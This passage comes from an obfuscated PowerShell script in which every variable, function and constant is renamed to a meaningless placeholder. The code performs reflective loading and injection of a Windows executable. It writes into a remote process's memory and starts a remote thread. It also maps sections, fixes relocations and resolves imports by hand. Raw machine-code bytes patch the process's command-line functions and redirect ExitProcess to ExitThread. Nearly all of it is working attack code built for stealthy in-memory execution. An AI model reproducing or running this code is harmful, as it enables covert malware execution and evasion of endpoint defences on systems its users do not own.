            $VAR0172 = FUN005 $VAR0172 ($VAR0163)
            FUN010 -Bytes $VAR01905 -VAR0129 $VAR0172
            $VAR0172 = FUN005 $VAR0172 ($VAR01905.Length)

            $VAR0178 = $VAR0042.FUN032.Invoke($VAR0161, [IntPtr]::Zero, [UIntPtr][UInt64]$VAR0171, $VAR0041.CONST001 -bor $VAR0041.CONST002, $VAR0041.CONST008)
            if ($VAR0178 -eq [IntPtr]::Zero) {
                Throw "ERROR21"
            }
            [UIntPtr]$VAR0167 = [UIntPtr]::Zero
            $Success = $VAR0042.FUN045.Invoke($VAR0161, $VAR0178, $VAR0173, [UIntPtr][UInt64]$VAR0171, [Ref]$VAR0167)
            if (($Success -eq $false) -or ([UInt64]$VAR0167 -ne [UInt64]$VAR0171)) {
                Throw "ERROR22"
            }

            $VAR0179 = FUN014 -ProcessHandle $VAR0161 -VAR0127 $VAR0178 -VAR0042 $VAR0042
            $VAR0144 = $VAR0042.FUN044.Invoke($VAR0179, 20000)
            if ($VAR0144 -ne 0) {
                Throw "ERROR23"
            }

            
            [IntPtr]$VAR0180 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($VAR0163)
            $VAR0144 = $VAR0042.FUN046.Invoke($VAR0161, $VAR0189, $VAR0180, [UIntPtr][UInt64]$VAR0163, [Ref]$VAR0167)
            if (($VAR0144 -eq $false) -or ($VAR0167 -eq 0)) {
                Throw "ERROR24"
            }
            [IntPtr]$VAR0191 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0180, [Type][IntPtr])

            
            $VAR0042.FUN039.Invoke($VAR0161, $VAR0178, [UIntPtr][UInt64]0, $VAR0041.CONST025) | Out-Null
            $VAR0042.FUN039.Invoke($VAR0161, $VAR0189, [UIntPtr][UInt64]0, $VAR0041.CONST025) | Out-Null

            if (-not $VAR0185) {
                $VAR0042.FUN039.Invoke($VAR0161, $VAR0186, [UIntPtr][UInt64]0, $VAR0041.CONST025) | Out-Null
            }

            return $VAR0191
        }


        Function FUN020 {
            Param(
                [Parameter(Position = 0, Mandatory = $true)]
                [Byte[]]
                $VAR001,

                [Parameter(Position = 1, Mandatory = $true)]
                [System.Object]
                $VAR0126,

                [Parameter(Position = 2, Mandatory = $true)]
                [System.Object]
                $VAR0042,

                [Parameter(Position = 3, Mandatory = $true)]
                [System.Object]
                $VAR010
            )

            for ( $i = 0; $i -lt $VAR0126.CONST031.CONST121.CONST072; $i++) {
                [IntPtr]$VAR0160 = [IntPtr](FUN005 ([Int64]$VAR0126.CONST036) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$VAR010.CONST142)))
                $VAR0192 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0160, [Type]$VAR010.CONST142)

                
                [IntPtr]$VAR0193 = [IntPtr](FUN005 ([Int64]$VAR0126.VAR0263) ([Int64]$VAR0192.CONST074))

                
                
                
                
                $VAR0194 = $VAR0192.CONST144

                if ($VAR0192.CONST145 -eq 0) {
                    $VAR0194 = 0
                }

                if ($VAR0194 -gt $VAR0192.CONST143) {
                    $VAR0194 = $VAR0192.CONST143
                }

                if ($VAR0194 -gt 0) {
                    FUN009 -VAR0125 "FUN020::MarshalCopy" -VAR0126 $VAR0126 -VAR0127 $VAR0193 -Size $VAR0194 | Out-Null
                    [System.Runtime.InteropServices.Marshal]::Copy($VAR001, [Int32]$VAR0192.CONST145, $VAR0193, $VAR0194)
                }

                
                if ($VAR0192.CONST144 -lt $VAR0192.CONST143) {
                    $VAR0195 = $VAR0192.CONST143 - $VAR0194
                    [IntPtr]$VAR0127 = [IntPtr](FUN005 ([Int64]$VAR0193) ([Int64]$VAR0194))
                    FUN009 -VAR0125 "FUN020::FUN034" -VAR0126 $VAR0126 -VAR0127 $VAR0127 -Size $VAR0195 | Out-Null
                    $VAR0042.FUN034.Invoke($VAR0127, 0, [IntPtr]$VAR0195) | Out-Null
                }
            }
        }


        Function FUN021 {
            Param(
                [Parameter(Position = 0, Mandatory = $true)]
                [System.Object]
                $VAR0126,

                [Parameter(Position = 1, Mandatory = $true)]
                [Int64]
                $VAR0196,

                [Parameter(Position = 2, Mandatory = $true)]
                [System.Object]
                $VAR0041,

                [Parameter(Position = 3, Mandatory = $true)]
                [System.Object]
                $VAR010
            )

            [Int64]$VAR0197 = 0
            $VAR0198 = $true 
            [UInt32]$VAR0199 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$VAR010.CONST150)

            
            if (($VAR0196 -eq [Int64]$VAR0126.CONST039) `
                    -or ($VAR0126.CONST031.CONST122.CONST112.Size -eq 0)) {
                return
            }


            elseif ((FUN006 ($VAR0196) ($VAR0126.CONST039)) -eq $true) {
                $VAR0197 = FUN004 ($VAR0196) ($VAR0126.CONST039)
                $VAR0198 = $false
            }
            elseif ((FUN006 ($VAR0126.CONST039) ($VAR0196)) -eq $true) {
                $VAR0197 = FUN004 ($VAR0126.CONST039) ($VAR0196)
            }

            
            [IntPtr]$VAR0200 = [IntPtr](FUN005 ([Int64]$VAR0126.VAR0263) ([Int64]$VAR0126.CONST031.CONST122.CONST112.CONST074))
            while ($true) {
                
                $VAR0201 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0200, [Type]$VAR010.CONST150)

                if ($VAR0201.CONST151 -eq 0) {
                    break
                }

                [IntPtr]$VAR0202 = [IntPtr](FUN005 ([Int64]$VAR0126.VAR0263) ([Int64]$VAR0201.CONST074))
                $VAR0203 = ($VAR0201.CONST151 - $VAR0199) / 2

                
                for ($i = 0; $i -lt $VAR0203; $i++) {
                    
                    $VAR0204 = [IntPtr](FUN005 ([IntPtr]$VAR0200) ([Int64]$VAR0199 + (2 * $i)))
                    [UInt16]$VAR0205 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0204, [Type][UInt16])

                    
                    [UInt16]$VAR0206 = $VAR0205 -band 0x0FFF
                    [UInt16]$VAR0207 = $VAR0205 -band 0xF000
                    for ($j = 0; $j -lt 12; $j++) {
                        $VAR0207 = [Math]::Floor($VAR0207 / 2)
                    }

                    
                    
                    
                    if (($VAR0207 -eq $VAR0041.CONST013) `
                            -or ($VAR0207 -eq $VAR0041.CONST014)) {
                        
                        [IntPtr]$VAR0208 = [IntPtr](FUN005 ([Int64]$VAR0202) ([Int64]$VAR0206))
                        [IntPtr]$VAR0209 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0208, [Type][IntPtr])

                        if ($VAR0198 -eq $true) {
                            [IntPtr]$VAR0209 = [IntPtr](FUN005 ([Int64]$VAR0209) ($VAR0197))
                        }
                        else {
                            [IntPtr]$VAR0209 = [IntPtr](FUN004 ([Int64]$VAR0209) ($VAR0197))
                        }

                        [System.Runtime.InteropServices.Marshal]::StructureToPtr($VAR0209, $VAR0208, $false) | Out-Null
                    }
                    elseif ($VAR0207 -ne $VAR0041.CONST012) {
                        
                        Throw "ERROR25: $VAR0207, ERROR26: $VAR0205"
                    }
                }

                $VAR0200 = [IntPtr](FUN005 ([Int64]$VAR0200) ([Int64]$VAR0201.CONST151))
            }
        }


        Function FUN022 {
            Param(
                [Parameter(Position = 0, Mandatory = $true)]
                [System.Object]
                $VAR0126,

                [Parameter(Position = 1, Mandatory = $true)]
                [System.Object]
                $VAR0042,

                [Parameter(Position = 2, Mandatory = $true)]
                [System.Object]
                $VAR010,

                [Parameter(Position = 3, Mandatory = $true)]
                [System.Object]
                $VAR0041,

                [Parameter(Position = 4, Mandatory = $false)]
                [IntPtr]
                $VAR0161
            )

            $VAR0210 = $false
            if ($VAR0126.VAR0263 -ne $VAR0126.CONST039) {
                $VAR0210 = $true
            }

            if ($VAR0126.CONST031.CONST122.CONST108.Size -gt 0) {
                [IntPtr]$VAR0211 = FUN005 ([Int64]$VAR0126.VAR0263) ([Int64]$VAR0126.CONST031.CONST122.CONST108.CONST074)

                while ($true) {
                    $VAR0212 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0211, [Type]$VAR010.CONST152)

                    
                    if ($VAR0212.CONST067 -eq 0 `
                            -and $VAR0212.CONST154 -eq 0 `
                            -and $VAR0212.CONST153 -eq 0 `
                            -and $VAR0212.Name -eq 0 `
                            -and $VAR0212.CONST071 -eq 0) {
                        
                        break
                    }

                    $VAR0213 = [IntPtr]::Zero
                    $VAR0162 = (FUN005 ([Int64]$VAR0126.VAR0263) ([Int64]$VAR0212.Name))
                    $VAR0164 = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($VAR0162)

                    if ($VAR0210 -eq $true) {
                        $VAR0213 = FUN018 -VAR0161 $VAR0161 -VAR0162 $VAR0162
                    }
                    else {
                        $VAR0213 = $VAR0042.FUN035.Invoke($VAR0164)
                    }

                    if (($VAR0213 -eq $null) -or ($VAR0213 -eq [IntPtr]::Zero)) {
                        throw "ERROR28: $VAR0164"
                    }

                    
                    [IntPtr]$VAR0214 = FUN005 ($VAR0126.VAR0263) ($VAR0212.CONST154)
                    [IntPtr]$VAR0215 = FUN005 ($VAR0126.VAR0263) ($VAR0212.CONST067) 
                    [IntPtr]$VAR0216 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0215, [Type][IntPtr])

                    while ($VAR0216 -ne [IntPtr]::Zero) {
                        $VAR0185 = $false
                        [IntPtr]$VAR0217 = [IntPtr]::Zero
                        
                        
                        
                        [IntPtr]$VAR0218 = [IntPtr]::Zero
                        if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4 -and [Int32]$VAR0216 -lt 0) {
                            [IntPtr]$VAR0217 = [IntPtr]$VAR0216 -band 0xffff 
                            $VAR0185 = $true
                        }
                        elseif ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8 -and [Int64]$VAR0216 -lt 0) {
                            [IntPtr]$VAR0217 = [Int64]$VAR0216 -band 0xffff 
                            $VAR0185 = $true
                        }
                        else {
                            [IntPtr]$VAR0219 = FUN005 ($VAR0126.VAR0263) ($VAR0216)
                            $VAR0219 = FUN005 $VAR0219 ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
                            $VAR0220 = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($VAR0219)
                            $VAR0217 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($VAR0220)
                        }

                        if ($VAR0210 -eq $true) {
                            [IntPtr]$VAR0218 = FUN019 -VAR0161 $VAR0161 -VAR0183 $VAR0213 -VAR0184 $VAR0217 -VAR0185 $VAR0185
                        }
                        else {
                            [IntPtr]$VAR0218 = $VAR0042.FUN037.Invoke($VAR0213, $VAR0217)
                        }

                        if ($VAR0218 -eq $null -or $VAR0218 -eq [IntPtr]::Zero) {
                            if ($VAR0185) {
                                Throw "ERROR30: $VAR0217 $VAR0164"
                            }
                            else {
                                Throw "ERROR31: $VAR0220 $VAR0164"
                            }
                        }

                        [System.Runtime.InteropServices.Marshal]::StructureToPtr($VAR0218, $VAR0214, $false)

                        $VAR0214 = FUN005 ([Int64]$VAR0214) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
                        [IntPtr]$VAR0215 = FUN005 ([Int64]$VAR0215) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
                        [IntPtr]$VAR0216 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0215, [Type][IntPtr])

                        
                        
                        if ((-not $VAR0185) -and ($VAR0217 -ne [IntPtr]::Zero)) {
                            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($VAR0217)
                            $VAR0217 = [IntPtr]::Zero
                        }
                    }

                    $VAR0211 = FUN005 ($VAR0211) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$VAR010.CONST152))
                }
            }
        }

        Function FUN023 {
            Param(
                [Parameter(Position = 0, Mandatory = $true)]
                [UInt32]
                $VAR0221
            )

            $VAR0222 = 0x0
            if (($VAR0221 -band $VAR0041.CONST016) -gt 0) {
                if (($VAR0221 -band $VAR0041.CONST017) -gt 0) {
                    if (($VAR0221 -band $VAR0041.CONST018) -gt 0) {
                        $VAR0222 = $VAR0041.CONST008
                    }
                    else {
                        $VAR0222 = $VAR0041.CONST009
                    }
                }
                else {
                    if (($VAR0221 -band $VAR0041.CONST018) -gt 0) {
                        $VAR0222 = $VAR0041.CONST010
                    }
                    else {
                        $VAR0222 = $VAR0041.CONST007
                    }
                }
            }
            else {
                if (($VAR0221 -band $VAR0041.CONST017) -gt 0) {
                    if (($VAR0221 -band $VAR0041.CONST018) -gt 0) {
                        $VAR0222 = $VAR0041.CONST005
                    }
                    else {
                        $VAR0222 = $VAR0041.CONST004
                    }
                }
                else {
                    if (($VAR0221 -band $VAR0041.CONST018) -gt 0) {
                        $VAR0222 = $VAR0041.CONST006
                    }
                    else {
                        $VAR0222 = $VAR0041.CONST003
                    }
                }
            }

            if (($VAR0221 -band $VAR0041.CONST019) -gt 0) {
                $VAR0222 = $VAR0222 -bor $VAR0041.CONST011
            }

            return $VAR0222
        }

        Function FUN024 {
            Param(
                [Parameter(Position = 0, Mandatory = $true)]
                [System.Object]
                $VAR0126,
        
                [Parameter(Position = 1, Mandatory = $true)]
                [System.Object]
                $VAR0042,
        
                [Parameter(Position = 2, Mandatory = $true)]
                [System.Object]
                $VAR0041,
        
                [Parameter(Position = 3, Mandatory = $true)]
                [System.Object]
                $VAR010
            )
        
            for ( $i = 0; $i -lt $VAR0126.CONST031.CONST121.CONST072; $i++) {
                [IntPtr]$VAR0160 = [IntPtr](FUN005 ([Int64]$VAR0126.CONST036) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$VAR010.CONST142)))
                $VAR0192 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0160, [Type]$VAR010.CONST142)
                [IntPtr]$VAR0223 = FUN005 ($VAR0126.VAR0263) ($VAR0192.CONST074)
            
                [UInt32]$VAR0224 = FUN023 $VAR0192.CONST067
                [UInt32]$VAR0225 = $VAR0192.CONST143
            
                [UInt32]$VAR0226 = 0
                FUN009 -VAR0125 "FUN024::FUN040" -VAR0126 $VAR0126 -VAR0127 $VAR0223 -Size $VAR0225 | Out-Null
                $Success = $VAR0042.FUN040.Invoke($VAR0223, $VAR0225, $VAR0224, [Ref]$VAR0226)
                if ($Success -eq $false) {
                    Throw "ERROR32"
                }
            }
        }

        
        
        Function FUN025 {
            Param(
                [Parameter(Position = 0, Mandatory = $true)]
                [System.Object]
                $VAR0126,
    
                [Parameter(Position = 1, Mandatory = $true)]
                [System.Object]
                $VAR0042,
    
                [Parameter(Position = 2, Mandatory = $true)]
                [System.Object]
                $VAR0041,
    
                [Parameter(Position = 3, Mandatory = $true)]
                [String]
                $VAR0227,
    
                [Parameter(Position = 4, Mandatory = $true)]
                [IntPtr]
                $VAR0228
            )
        
            
            $VAR0229 = @()
    
            $VAR0163 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
            [UInt32]$VAR0226 = 0
    
            [IntPtr]$VAR0168 = $VAR0042.FUN041.Invoke("Kernel32.dll")
            if ($VAR0168 -eq [IntPtr]::Zero) {
                throw "ERROR33"
            }
    
            [IntPtr]$VAR0230 = $VAR0042.FUN041.Invoke("KernelBase.dll")
            if ($VAR0230 -eq [IntPtr]::Zero) {
                throw "ERROR34"
            }
    
            
            
            
            $VAR0231 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($VAR0227)
            $VAR0232 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($VAR0227)
    
            [IntPtr]$VAR0233 = $VAR0042.FUN036.Invoke($VAR0230, "GetCommandLineA")
            [IntPtr]$VAR0234 = $VAR0042.FUN036.Invoke($VAR0230, "GetCommandLineW")
    
            if ($VAR0233 -eq [IntPtr]::Zero -or $VAR0234 -eq [IntPtr]::Zero) {
                throw "ERROR36: $(FUN008 $VAR0233). ERROR37: $(FUN008 $VAR0234)"
            }
    
            
            [Byte[]]$VAR0235 = @()
            if ($VAR0163 -eq 8) {
                $VAR0235 += 0x48 
            }
            $VAR0235 += 0xb8
    
            [Byte[]]$VAR0236 = @(0xc3)
            $VAR0237 = $VAR0235.Length + $VAR0163 + $VAR0236.Length
    
            
            $VAR0238 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($VAR0237)
            $VAR0239 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($VAR0237)
            $VAR0042.FUN033.Invoke($VAR0238, $VAR0233, [UInt64]$VAR0237) | Out-Null
            $VAR0042.FUN033.Invoke($VAR0239, $VAR0234, [UInt64]$VAR0237) | Out-Null
            $VAR0229 += , ($VAR0233, $VAR0238, $VAR0237)
            $VAR0229 += , ($VAR0234, $VAR0239, $VAR0237)
    
            
            [UInt32]$VAR0226 = 0
            $Success = $VAR0042.FUN040.Invoke($VAR0233, [UInt32]$VAR0237, [UInt32]($VAR0041.CONST008), [Ref]$VAR0226)
            if ($Success = $false) {
                throw "ERROR39"
            }
    
            $VAR0240 = $VAR0233
            FUN010 -Bytes $VAR0235 -VAR0129 $VAR0240
            $VAR0240 = FUN005 $VAR0240 ($VAR0235.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($VAR0232, $VAR0240, $false)
            $VAR0240 = FUN005 $VAR0240 $VAR0163
            FUN010 -Bytes $VAR0236 -VAR0129 $VAR0240
    
            $VAR0042.FUN040.Invoke($VAR0233, [UInt32]$VAR0237, [UInt32]$VAR0226, [Ref]$VAR0226) | Out-Null
    
    
            
            [UInt32]$VAR0226 = 0
            $Success = $VAR0042.FUN040.Invoke($VAR0234, [UInt32]$VAR0237, [UInt32]($VAR0041.CONST008), [Ref]$VAR0226)
            if ($Success = $false) {
                throw "ERROR40"
            }
    
            $VAR0234Temp = $VAR0234
            FUN010 -Bytes $VAR0235 -VAR0129 $VAR0234Temp
            $VAR0234Temp = FUN005 $VAR0234Temp ($VAR0235.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($VAR0231, $VAR0234Temp, $false)
            $VAR0234Temp = FUN005 $VAR0234Temp $VAR0163
            FUN010 -Bytes $VAR0236 -VAR0129 $VAR0234Temp
    
            $VAR0042.FUN040.Invoke($VAR0234, [UInt32]$VAR0237, [UInt32]$VAR0226, [Ref]$VAR0226) | Out-Null
            
    
            
            
            
            
            
            $VAR0241 = @("msvcr70d.dll", "msvcr71d.dll", "msvcr80d.dll", "msvcr90d.dll", "msvcr100d.dll", "msvcr110d.dll", "msvcr70.dll" `
                    , "msvcr71.dll", "msvcr80.dll", "msvcr90.dll", "msvcr100.dll", "msvcr110.dll", "msvcr120.dll", "msvcrt.dll")
    
            foreach ($VAR0242 in $VAR0241) {
                [IntPtr]$VAR0243 = $VAR0042.FUN041.Invoke($VAR0242)
                if ($VAR0243 -ne [IntPtr]::Zero) {
                    [IntPtr]$VAR0244 = $VAR0042.FUN036.Invoke($VAR0243, "_wcmdln")
                    [IntPtr]$VAR0245 = $VAR0042.FUN036.Invoke($VAR0243, "_acmdln")
                    if ($VAR0244 -eq [IntPtr]::Zero -or $VAR0245 -eq [IntPtr]::Zero) {
                        "ERROR41"
                    }
    
                    $VAR0246 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($VAR0227)
                    $VAR0247 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($VAR0227)
    
                    
                    $VAR0248 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0245, [Type][IntPtr])
                    $VAR0249 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0244, [Type][IntPtr])
                    $VAR0250 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($VAR0163)
                    $VAR0251 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($VAR0163)
                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($VAR0248, $VAR0250, $false)
                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($VAR0249, $VAR0251, $false)
                    $VAR0229 += , ($VAR0245, $VAR0250, $VAR0163)
                    $VAR0229 += , ($VAR0244, $VAR0251, $VAR0163)
    
                    $Success = $VAR0042.FUN040.Invoke($VAR0245, [UInt32]$VAR0163, [UInt32]($VAR0041.CONST008), [Ref]$VAR0226)
                    if ($Success = $false) {
                        throw "ERROR42"
                    }
                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($VAR0246, $VAR0245, $false)
                    $VAR0042.FUN040.Invoke($VAR0245, [UInt32]$VAR0163, [UInt32]($VAR0226), [Ref]$VAR0226) | Out-Null
    
                    $Success = $VAR0042.FUN040.Invoke($VAR0244, [UInt32]$VAR0163, [UInt32]($VAR0041.CONST008), [Ref]$VAR0226)
                    if ($Success = $false) {
                        throw "ERROR43"
                    }
                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($VAR0247, $VAR0244, $false)
                    $VAR0042.FUN040.Invoke($VAR0244, [UInt32]$VAR0163, [UInt32]($VAR0226), [Ref]$VAR0226) | Out-Null
                }
            }
            
    
            
            
    
            $VAR0229 = @()
            $VAR0252 = @() 
    
            
            [IntPtr]$VAR0253 = $VAR0042.FUN041.Invoke("mscoree.dll")
            if ($VAR0253 -eq [IntPtr]::Zero) {
                throw "ERROR44"
            }
            [IntPtr]$VAR0254 = $VAR0042.FUN036.Invoke($VAR0253, "CorExitProcess")
            if ($VAR0254 -eq [IntPtr]::Zero) {
                Throw "ERROR45"
            }
            $VAR0252 += $VAR0254
    
            
            [IntPtr]$VAR0255 = $VAR0042.FUN036.Invoke($VAR0168, "ExitProcess")
            if ($VAR0255 -eq [IntPtr]::Zero) {
                Throw "ERROR46"
            }
            $VAR0252 += $VAR0255
    
            [UInt32]$VAR0226 = 0
            foreach ($VAR0256 in $VAR0252) {
                $VAR0257 = $VAR0256
                
                
                [Byte[]]$VAR0235 = @(0xbb)
                [Byte[]]$VAR0236 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
                
                if ($VAR0163 -eq 8) {
                    [Byte[]]$VAR0235 = @(0x48, 0xbb)
                    [Byte[]]$VAR0236 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
                }
                [Byte[]]$VAR0258 = @(0xff, 0xd3)
                $VAR0237 = $VAR0235.Length + $VAR0163 + $VAR0236.Length + $VAR0163 + $VAR0258.Length
    
                [IntPtr]$VAR0259 = $VAR0042.FUN036.Invoke($VAR0168, "ExitThread")
                if ($VAR0259 -eq [IntPtr]::Zero) {
                    Throw "ERROR47"
                }
    
                $Success = $VAR0042.FUN040.Invoke($VAR0256, [UInt32]$VAR0237, [UInt32]$VAR0041.CONST008, [Ref]$VAR0226)
                if ($Success -eq $false) {
                    Throw "ERROR48"
                }
    
                
                $VAR0260 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($VAR0237)
                $VAR0042.FUN033.Invoke($VAR0260, $VAR0256, [UInt64]$VAR0237) | Out-Null
                $VAR0229 += , ($VAR0256, $VAR0260, $VAR0237)
    
                
                
                FUN010 -Bytes $VAR0235 -VAR0129 $VAR0257
                $VAR0257 = FUN005 $VAR0257 ($VAR0235.Length)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($VAR0228, $VAR0257, $false)
                $VAR0257 = FUN005 $VAR0257 $VAR0163
                FUN010 -Bytes $VAR0236 -VAR0129 $VAR0257
                $VAR0257 = FUN005 $VAR0257 ($VAR0236.Length)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($VAR0259, $VAR0257, $false)
                $VAR0257 = FUN005 $VAR0257 $VAR0163
                FUN010 -Bytes $VAR0258 -VAR0129 $VAR0257
    
                $VAR0042.FUN040.Invoke($VAR0256, [UInt32]$VAR0237, [UInt32]$VAR0226, [Ref]$VAR0226) | Out-Null
            }
            
    
            Write-Output $VAR0229
        }

        
        
        Function FUN026 {
            Param(
                [Parameter(Position = 0, Mandatory = $true)]
                [Array[]]
                $VAR0261,

                [Parameter(Position = 1, Mandatory = $true)]
                [System.Object]
                $VAR0042,

                [Parameter(Position = 2, Mandatory = $true)]
                [System.Object]
                $VAR0041
            )

            [UInt32]$VAR0226 = 0
            foreach ($VAR0262 in $VAR0261) {
                $Success = $VAR0042.FUN040.Invoke($VAR0262[0], [UInt32]$VAR0262[2], [UInt32]$VAR0041.CONST008, [Ref]$VAR0226)
                if ($Success -eq $false) {
                    Throw "ERROR50"
                }

                $VAR0042.FUN033.Invoke($VAR0262[0], $VAR0262[1], [UInt64]$VAR0262[2]) | Out-Null

                $VAR0042.FUN040.Invoke($VAR0262[0], [UInt32]$VAR0262[2], [UInt32]$VAR0226, [Ref]$VAR0226) | Out-Null
            }
        }


        
        
        
        Function FUN027 {
            Param(
                [Parameter(Position = 0, Mandatory = $true)]
                [IntPtr]
                $VAR0263,

                [Parameter(Position = 1, Mandatory = $true)]
                [String]
                $VAR0187
            )

            $VAR010 = FUN001
            $VAR0041 = FUN002
            $VAR0126 = FUN017 -VAR0263 $VAR0263 -VAR010 $VAR010 -VAR0041 $VAR0041

            
            if ($VAR0126.CONST031.CONST122.CONST107.Size -eq 0) {
                return [IntPtr]::Zero
            }
            $VAR0264 = FUN005 ($VAR0263) ($VAR0126.CONST031.CONST122.CONST107.CONST074)
            $VAR0265 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0264, [Type]$VAR010.CONST155)

            for ($i = 0; $i -lt $VAR0265.CONST159; $i++) {
                
                $VAR0266 = FUN005 ($VAR0263) ($VAR0265.CONST161 + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
                $VAR0267 = FUN005 ($VAR0263) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0266, [Type][UInt32]))
                $VAR0268 = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($VAR0267)

                if ($VAR0268 -ceq $VAR0187) {
                    
                    
                    $VAR0269 = FUN005 ($VAR0263) ($VAR0265.CONST162 + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
                    $VAR0270 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0269, [Type][UInt16])
                    $VAR0271 = FUN005 ($VAR0263) ($VAR0265.CONST160 + ($VAR0270 * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
                    $VAR0272 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0271, [Type][UInt32])
                    return FUN005 ($VAR0263) ($VAR0272)
                }
            }

            return [IntPtr]::Zero
        }


        Function FUN028 {
            Param(
                [Parameter( Position = 0, Mandatory = $true )]
                [Byte[]]
                $VAR001,

                [Parameter(Position = 1, Mandatory = $false)]
                [String]
                $VAR004,

                [Parameter(Position = 2, Mandatory = $false)]
                [IntPtr]
                $VAR0161,

                [Parameter(Position = 3)]
                [Bool]
                $VAR007 = $false
            )

            $VAR0163 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])

            
            $VAR0041 = FUN002
            $VAR0042 = FUN003
            $VAR010 = FUN001

            $VAR0210 = $false
            if (($VAR0161 -ne $null) -and ($VAR0161 -ne [IntPtr]::Zero)) {
                $VAR0210 = $true
            }

            
            $VAR0126 = FUN016 -VAR001 $VAR001 -VAR010 $VAR010
            $VAR0196 = $VAR0126.VAR0196
            $VAR0273 = $true
            if (([Int] $VAR0126.CONST035 -band $VAR0041.CONST024) -ne $VAR0041.CONST024) {

                $VAR0273 = $false
            }

            
            $VAR0274 = $true
            if ($VAR0210 -eq $true) {
                $VAR0168 = $VAR0042.FUN041.Invoke("kernel32.dll")
                $VAR0144 = $VAR0042.FUN036.Invoke($VAR0168, "IsWow64Process")
                if ($VAR0144 -eq [IntPtr]::Zero) {
                    Throw "ERROR52"
                }

                [Bool]$VAR0275 = $false
                $Success = $VAR0042.FUN055.Invoke($VAR0161, [Ref]$VAR0275)
                if ($Success -eq $false) {
                    Throw "ERROR53"
                }

                if (($VAR0275 -eq $true) -or (($VAR0275 -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4))) {
                    $VAR0274 = $false
                }

                
                $VAR0276 = $true
                if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8) {
                    $VAR0276 = $false
                }
                if ($VAR0276 -ne $VAR0274) {
                    throw "ERROR54"
                }
            }
            else {
                if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8) {
                    $VAR0274 = $false
                }
            }
            if ($VAR0274 -ne $VAR0126.CONST032) {
                Throw "ERROR55"
            }

            

            
            [IntPtr]$VAR0277 = [IntPtr]::Zero
            $VAR0278 = ([Int] $VAR0126.CONST035 -band $VAR0041.CONST023) -eq $VAR0041.CONST023
            if ((-not $VAR007) -and (-not $VAR0278)) {
                Write-Warning "ERROR56" -WarningAction Continue
                [IntPtr]$VAR0277 = $VAR0196
            }
            


            $VAR0263 = [IntPtr]::Zero              
            $VAR0279 = [IntPtr]::Zero     
            if ($VAR0210 -eq $true) {
                
                $VAR0263 = $VAR0042.FUN031.Invoke([IntPtr]::Zero, [UIntPtr]$VAR0126.CONST033, $VAR0041.CONST001 -bor $VAR0041.CONST002, $VAR0041.CONST005)

                
                $VAR0279 = $VAR0042.FUN032.Invoke($VAR0161, $VAR0277, [UIntPtr]$VAR0126.CONST033, $VAR0041.CONST001 -bor $VAR0041.CONST002, $VAR0041.CONST008)
                if ($VAR0279 -eq [IntPtr]::Zero) {
                    Throw "ERROR57"
                }
            }
            else {
                if ($VAR0273 -eq $true) {
                    $VAR0263 = $VAR0042.FUN031.Invoke($VAR0277, [UIntPtr]$VAR0126.CONST033, $VAR0041.CONST001 -bor $VAR0041.CONST002, $VAR0041.CONST005)
                }
                else {
